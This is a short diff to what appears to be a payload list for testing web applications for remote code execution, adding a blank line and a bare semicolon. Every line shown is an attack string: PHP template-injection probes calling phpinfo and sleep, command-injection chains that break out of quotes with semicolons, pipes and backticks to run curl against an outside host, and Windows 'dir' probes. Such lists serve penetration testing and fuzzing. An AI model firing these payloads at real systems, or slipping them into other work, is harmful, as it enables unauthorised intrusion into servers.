@@ -1,8 +1,10 @@
+
  {${phpinfo()}}
  {${sleep(20)}}
  {${sleep(3)}}
  {${sleep(hexdec(dechex(20)))}} 
  curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\" |curl https://crowdshield.com/.testing/rce_vuln.txt
+; 
 ; curl https://crowdshield.com/.testing/rce_vuln.txt
 ; dir
 ; dir C:\
